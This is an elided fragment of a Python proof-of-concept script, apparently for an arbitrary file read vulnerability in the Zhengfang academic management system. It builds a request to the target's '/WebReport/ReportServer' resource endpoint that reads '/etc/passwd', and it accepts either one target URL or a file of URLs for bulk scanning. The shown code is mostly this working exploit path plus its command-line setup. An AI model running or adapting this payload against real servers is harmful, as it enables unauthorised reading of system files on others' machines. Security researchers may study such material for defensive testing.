...
def check_url(url):
    ...
    url = url + '/WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true'
    # print(url)
    try:
...
if __name__ == '__main__':
    ...
    arg.add_argument("-u",
                     "--url",
                     help="Target URL; Example:python3 .\正方教务系统任意文件读取.py -u http://ip:port")
    arg.add_argument("-f",
                     "--file",
                     help="Target URL; Example:python3 .\正方教务系统任意文件读取.py -f url.txt")
    args = arg.parse_args()
    url = args.url
    filename = args.file
    print("[+]任务开始.....")
